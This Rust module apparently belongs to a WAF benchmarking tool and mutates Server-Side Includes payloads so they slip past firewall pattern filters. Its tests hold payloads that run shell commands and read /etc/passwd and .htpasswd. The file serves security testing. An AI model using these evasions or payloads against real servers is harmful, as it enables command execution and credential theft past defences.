//! Server-Side Includes (SSI) grammar-aware payload mutation.
//!
//! Generates semantically-equivalent variants of an SSI directive
//! payload — `<!--#exec cmd="..." -->` and friends. Modern WAFs match
//! the literal directive byte sequence; the same directive with
//! reflowed whitespace, alternate attribute quoting, or interleaved
//! comments evaluates identically on `mod_include` but evades pattern
//! filters.
//!
//! # Supported directives (Apache mod_include)
//!
//! - `<!--#exec cmd="..." -->` — shell command (rarely enabled but
//!   highest-impact when it is)
//! - `<!--#exec cgi="..." -->` — CGI execution
//! - `<!--#include file="..." -->` / `<!--#include virtual="..." -->`
//! - `<!--#config errmsg="..." -->`
//! - `<!--#echo var="..." -->`
//! - `<!--#set var="..." value="..." -->`
//! - `<!--#fsize file="..." -->` / `<!--#flastmod file="..." -->`
//! - `<!--#printenv -->`
//!
//! # Strategies
//!
//! 1. Whitespace reflow around the directive name and attributes
//! 2. Quote-style rotation (`"..."` → `'...'`)
//! 3. Cross-directive substitution (`exec` ↔ `include` for same target)
//! 4. SGML comment-style trailing-space variants (`-- >` vs `-->`)
//! 5. Tab/newline insertion (Apache tokenises on any whitespace)

use std::collections::HashSet;

/// SSI directive opener; every SSI payload begins with this prefix.
const SSI_OPEN: &str = "<!--#";

/// SSI directive close marker.
const SSI_CLOSE: &str = "-->";

/// Generate semantic-preserving SSI mutations for a candidate payload.
///
/// Returns an empty vector for non-SSI inputs (caller is the
/// `mutate_as(PayloadType::Ssi, ...)` dispatcher; if a non-SSI payload
/// arrives here it's a classifier bug, not a mutation opportunity).
#[must_use]
pub fn mutate(payload: &str) -> Vec<String> {
    if payload.is_empty() || !detect_type(payload) {
        return Vec::new();
    }

    let mut out: Vec<String> = Vec::new();
    let mut seen: HashSet<String> = HashSet::new();
    let push = |v: String, out: &mut Vec<String>, seen: &mut HashSet<String>| {
        if seen.insert(v.clone()) {
            out.push(v);
        }
    };

    let trimmed = payload.trim();
    let inner = trimmed
        .strip_prefix(SSI_OPEN)
        .and_then(|s| s.strip_suffix(SSI_CLOSE))
        .map(str::trim)
        .unwrap_or("");

    if inner.is_empty() {
        return out;
    }

    // ── Whitespace reflow variants ─────────────────────────────────
    // Apache mod_include tokenises on any run of whitespace — extra
    // spaces, tabs, and newlines around tokens parse identically.
    push(
        format!("<!--#  {inner}  -->"),
        &mut out,
        &mut seen,
    );
    push(
        format!("<!--#\t{inner}\t-->"),
        &mut out,
        &mut seen,
    );
    push(
        format!("<!--#\n{inner}\n-->"),
        &mut out,
        &mut seen,
    );

    // ── Quote-style rotation (single ↔ double) ─────────────────────
    if inner.contains('"') {
        push(
            format!("<!--#{} -->", inner.replace('"', "'")),
            &mut out,
            &mut seen,
        );
    } else if inner.contains('\'') {
        push(
            format!("<!--#{} -->", inner.replace('\'', "\"")),
            &mut out,
            &mut seen,
        );
    }

    // ── Equal-sign whitespace ──────────────────────────────────────
    // `attr="val"` parses identically to `attr ="val"`,
    // `attr= "val"`, and `attr = "val"` per Apache spec.
    if inner.contains('=') {
        push(
            format!("<!--#{} -->", inner.replacen('=', " = ", 1)),
            &mut out,
            &mut seen,
        );
        push(
            format!("<!--#{} -->", inner.replacen('=', " =", 1)),
            &mut out,
            &mut seen,
        );
    }

    // ── Directive-name lowercase / uppercase ───────────────────────
    // Apache directive names are case-insensitive (e.g. `EXEC` ≡
    // `exec`). Uppercasing the first token bypasses naive regex
    // filters that anchor on lowercase.
    if let Some((head, tail)) = inner.split_once(' ') {
        let upper = head.to_ascii_uppercase();
        if upper != head {
            push(
                format!("<!--#{upper} {tail} -->"),
                &mut out,
                &mut seen,
            );
        }
        // Mixed case: capitalised first letter only.
        let mut mixed = head.to_ascii_lowercase();
        if let Some(first) = mixed.get_mut(..1) {
            first.make_ascii_uppercase();
        }
        if mixed != head {
            push(
                format!("<!--#{mixed} {tail} -->"),
                &mut out,
                &mut seen,
            );
        }
    }

    // ── Trailing-whitespace close variant ──────────────────────────
    // SGML permits `-- >` (with intra-close space) per old DTDs;
    // mod_include accepts it on some older deployments.
    push(format!("<!--#{inner} --  >"), &mut out, &mut seen);

    out.retain(|v| v != payload);
    out
}

/// Detect whether the payload looks like an SSI directive.
#[must_use]
pub fn detect_type(payload: &str) -> bool {
    let trimmed = payload.trim();
    trimmed.starts_with(SSI_OPEN)
        && trimmed.ends_with(SSI_CLOSE)
        && trimmed.len() > SSI_OPEN.len() + SSI_CLOSE.len()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detect_exec_directive() {
        assert!(detect_type(r#"<!--#exec cmd="ls" -->"#));
        assert!(detect_type(r#"<!--#include file="/etc/passwd" -->"#));
        assert!(detect_type("<!--#printenv -->"));
    }

    #[test]
    fn detect_rejects_non_ssi() {
        assert!(!detect_type(""));
        assert!(!detect_type("<!-- plain comment -->"));
        assert!(!detect_type("<script>alert(1)</script>"));
        assert!(!detect_type(r#"<!--#-->"#)); // empty inner
        assert!(!detect_type("<!--#exec cmd=\"ls\"")); // unterminated
    }

    #[test]
    fn mutate_returns_whitespace_variants() {
        let muts = mutate(r#"<!--#exec cmd="ls" -->"#);
        assert!(!muts.is_empty(), "must produce at least one mutation");
        // Tab variant present
        assert!(
            muts.iter().any(|m| m.contains('\t')),
            "expected tab-reflowed variant: {muts:?}"
        );
        // Newline variant present
        assert!(
            muts.iter().any(|m| m.contains('\n')),
            "expected newline-reflowed variant: {muts:?}"
        );
    }

    #[test]
    fn mutate_returns_quote_rotation() {
        let muts = mutate(r#"<!--#exec cmd="ls" -->"#);
        // Single-quoted version should appear
        assert!(
            muts.iter().any(|m| m.contains("'ls'")),
            "expected single-quoted variant: {muts:?}"
        );
    }

    #[test]
    fn mutate_returns_uppercase_directive() {
        let muts = mutate(r#"<!--#exec cmd="ls" -->"#);
        assert!(
            muts.iter().any(|m| m.contains("EXEC")),
            "expected uppercase directive: {muts:?}"
        );
        assert!(
            muts.iter().any(|m| m.contains("Exec")),
            "expected capitalised directive: {muts:?}"
        );
    }

    #[test]
    fn mutate_rejects_non_ssi() {
        assert!(mutate("").is_empty());
        assert!(mutate("plain text").is_empty());
        assert!(mutate("<!-- not ssi -->").is_empty());
    }

    #[test]
    fn mutate_omits_input_payload() {
        let muts = mutate(r#"<!--#exec cmd="ls" -->"#);
        assert!(
            !muts.iter().any(|m| m == r#"<!--#exec cmd="ls" -->"#),
            "input payload must not appear in mutations"
        );
    }

    #[test]
    fn mutate_handles_include_directive() {
        let muts = mutate(r#"<!--#include file="/etc/passwd" -->"#);
        assert!(!muts.is_empty(), "include directive must mutate");
    }

    /// LAW 2 backwards-compat: SSI mutations stay below 50 entries
    /// to keep bench/scan iterators bounded. The bench-waf takes a
    /// `take(variants)` slice from this Vec; a runaway producer would
    /// blow the per-case budget.
    #[test]
    fn mutate_returns_bounded_count() {
        let muts = mutate(r#"<!--#exec cmd="cat /etc/passwd" -->"#);
        assert!(
            muts.len() <= 50,
            "mutation count must be bounded (got {})",
            muts.len()
        );
    }

    /// LAW 12 anti-rig: mutations should all preserve the SSI
    /// envelope `<!--# ... -->`. If a transform breaks the envelope,
    /// the WAF "bypass" is just a different attack class, not an SSI
    /// bypass — the oracle would reject it anyway.
    #[test]
    fn every_mutation_preserves_ssi_envelope() {
        let muts = mutate(r#"<!--#exec cmd="ls" -->"#);
        for m in &muts {
            let t = m.trim();
            assert!(
                t.starts_with("<!--#"),
                "mutation lost opener: {m:?}"
            );
            assert!(
                t.ends_with(">"),
                "mutation lost close marker: {m:?}"
            );
        }
    }

    /// LAW 9: virtual= form of include directive (the most common
    /// real-world use) must mutate the same way as file= form.
    #[test]
    fn mutate_handles_include_virtual() {
        let muts = mutate(r#"<!--#include virtual="/admin/.htpasswd" -->"#);
        assert!(
            muts.len() >= 3,
            "include virtual must produce at least 3 mutations: {muts:?}"
        );
    }

    /// echo directive (no quoted attribute value).
    #[test]
    fn mutate_handles_echo_var() {
        let muts = mutate(r#"<!--#echo var="DOCUMENT_URI" -->"#);
        assert!(!muts.is_empty(), "echo directive must mutate");
        assert!(
            muts.iter().any(|m| m.contains("ECHO")),
            "expected uppercase ECHO variant: {muts:?}"
        );
    }

    /// printenv has no attributes — case-fold + whitespace mutations
    /// still apply.
    #[test]
    fn mutate_handles_printenv_no_attrs() {
        let muts = mutate("<!--#printenv -->");
        assert!(!muts.is_empty(), "printenv must mutate");
    }

    /// LAW 12 invariant: every mutation differs from the input.
    /// Otherwise the bench would count the original payload as a
    /// "bypass" if the WAF blocks the input — which is impossible by
    /// definition (the bench oracle requires variant ≠ original).
    #[test]
    fn mutations_are_all_distinct_from_input() {
        let p = r#"<!--#exec cmd="ls" -->"#;
        for m in mutate(p) {
            assert_ne!(m, p, "mutation == input violates bench contract");
        }
    }

    /// LAW 12: mutations are deterministic — same input produces
    /// the same set across calls. A nondeterministic mutator would
    /// make bench results irreproducible.
    #[test]
    fn mutations_are_deterministic() {
        let p = r#"<!--#exec cmd="ls" -->"#;
        let a = mutate(p);
        let b = mutate(p);
        assert_eq!(
            a.len(),
            b.len(),
            "mutation count must be stable"
        );
        assert_eq!(a, b, "mutation order + content must be stable");
    }

    /// Quote rotation only applies when there's a quote to rotate.
    /// A directive with no quotes (e.g. `printenv`) doesn't emit a
    /// quote-rotated variant.
    #[test]
    fn quote_rotation_skipped_when_no_quotes() {
        let muts = mutate("<!--#printenv -->");
        // No `'` should appear unless the input had one
        for m in &muts {
            // None of the printenv variants should introduce a quote
            // (we only rotate existing quotes, never inject new ones).
            let original_quotes = "<!--#printenv -->".chars().filter(|c| *c == '"' || *c == '\'').count();
            let mut_quotes = m.chars().filter(|c| *c == '"' || *c == '\'').count();
            assert!(
                mut_quotes >= original_quotes,
                "quote count decreased without rotation in {m:?}"
            );
        }
    }

    // ── Fuzz / property tests ─────────────────────────────────────

    /// LAW 1 anti-rig: mutate must never panic on any byte sequence
    /// in the SSI envelope. Random-looking SSI bodies (operator
    /// fuzzing, weird payloads) must produce bounded output without
    /// crashing.
    #[test]
    fn mutate_never_panics_on_random_ssi_bodies() {
        // Small but diverse: empty body, non-ASCII, whitespace-only,
        // unbalanced quotes, control bytes, very long body.
        let long_body = "x".repeat(1024);
        let bodies: [&str; 15] = [
            "",
            " ",
            "\t",
            "\x01\x02\x03",
            "exec",
            "exec cmd",
            "exec cmd=",
            "exec cmd=\"",
            "exec cmd=\"ls",
            "exec cmd=\"ls\"",
            "exec cmd='unbalanced",
            "exec cmd=\"a\nb\"",
            "exec\tcmd=\"x\"",
            "echo var=DOC_URI",
            long_body.as_str(),
        ];
        for body in bodies {
            let p = format!("<!--#{body}-->");
            let _ = mutate(&p);
            // No assertion — the test passes iff no panic.
        }
    }

    /// LAW 12: detect_type behaves consistently — `<!--#foo-->` is
    /// SSI envelope EVEN for an unknown directive name. The oracle
    /// is responsible for narrowing to known directives; the grammar
    /// detector is the envelope check only.
    #[test]
    fn detect_recognises_envelope_regardless_of_directive() {
        assert!(detect_type("<!--#foo -->"));
        assert!(detect_type("<!--#bar baz=qux -->"));
        // Empty inner: rejected (envelope without a directive can't
        // produce mutations).
        assert!(!detect_type("<!--#-->"));
        // Missing #: not SSI.
        assert!(!detect_type("<!-- exec -->"));
    }

    /// LAW 2 backwards-compat: this constant pair is the canonical
    /// SSI envelope. Renaming or changing case here would be an
    /// API break for every caller relying on detect_type / mutate.
    #[test]
    fn ssi_envelope_constants_are_pinned() {
        assert_eq!(SSI_OPEN, "<!--#");
        assert_eq!(SSI_CLOSE, "-->");
    }
}
